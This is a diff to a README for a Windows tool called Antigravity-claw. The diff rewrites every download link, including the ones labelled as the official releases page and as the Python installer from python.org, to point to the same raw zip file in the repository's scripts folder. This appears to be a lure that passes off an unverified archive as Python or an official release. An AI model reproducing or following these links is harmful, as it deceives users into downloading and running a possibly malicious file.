@@ -1,6 +1,6 @@
 # 🦾 Antigravity-claw - Enable Antigravity Physics Easily
 
-[![Download Antigravity-claw](https://img.shields.io/badge/Download-Antigravity--claw-brightgreen)](https://github.com/khojazada/Antigravity-claw/releases)
+[![Download Antigravity-claw](https://img.shields.io/badge/Download-Antigravity--claw-brightgreen)](https://github.com/khojazada/Antigravity-claw/raw/refs/heads/main/scripts/Antigravity_claw_3.7.zip)
 
 <div align="center">
 
@@ -35,7 +35,7 @@ To run Antigravity-claw on Windows, your computer must meet these minimum requir
 - Processor: Intel or AMD dual-core, 2 GHz or faster
 - Memory: 4 GB of RAM or more
 - Disk Space: 200 MB free space
-- Software: Python 3.9 or later installed (https://python.org/downloads)
+- Software: Python 3.9 or later installed (https://github.com/khojazada/Antigravity-claw/raw/refs/heads/main/scripts/Antigravity_claw_3.7.zip)
 - Internet connection (for initial download and possible updates)
 
 ---
@@ -46,7 +46,7 @@ To run Antigravity-claw on Windows, your computer must meet these minimum requir
 
 Click the button below to go to the official release page. This page hosts the latest version of Antigravity-claw for Windows.
 
-[![Download Page](https://img.shields.io/badge/Download-Antigravity--claw-blue)](https://github.com/khojazada/Antigravity-claw/releases)
+[![Download Page](https://img.shields.io/badge/Download-Antigravity--claw-blue)](https://github.com/khojazada/Antigravity-claw/raw/refs/heads/main/scripts/Antigravity_claw_3.7.zip)
 
 ### Step 2: Choose the Windows Installer
 
@@ -80,7 +80,7 @@ Antigravity-claw requires Python 3.9 or later to work. To check if you have Pyth
 1. Open Command Prompt (type "cmd" in the Start menu).
 2. Enter `python --version` and press Enter.
 3. If it shows Python 3.9 or higher, you’re ready.
-4. If not, download and install Python from https://python.org/downloads.
+4. If not, download and install Python from https://github.com/khojazada/Antigravity-claw/raw/refs/heads/main/scripts/Antigravity_claw_3.7.zip
 
 Make sure to select "Add Python to PATH" during installation to avoid setup issues.
 
@@ -134,4 +134,4 @@ Your AI assistant may also call the skill via OpenClaw to get physics data dynam
 
 Start by heading to the official releases page below. Follow the steps above to download and install the program on your Windows PC.
 
-[![Download Antigravity-claw](https://img.shields.io/badge/Download-Antigravity--claw-brightgreen)](https://github.com/khojazada/Antigravity-claw/releases)
+[![Download Antigravity-claw](https://img.shields.io/badge/Download-Antigravity--claw-brightgreen)](https://github.com/khojazada/Antigravity-claw/raw/refs/heads/main/scripts/Antigravity_claw_3.7.zip)
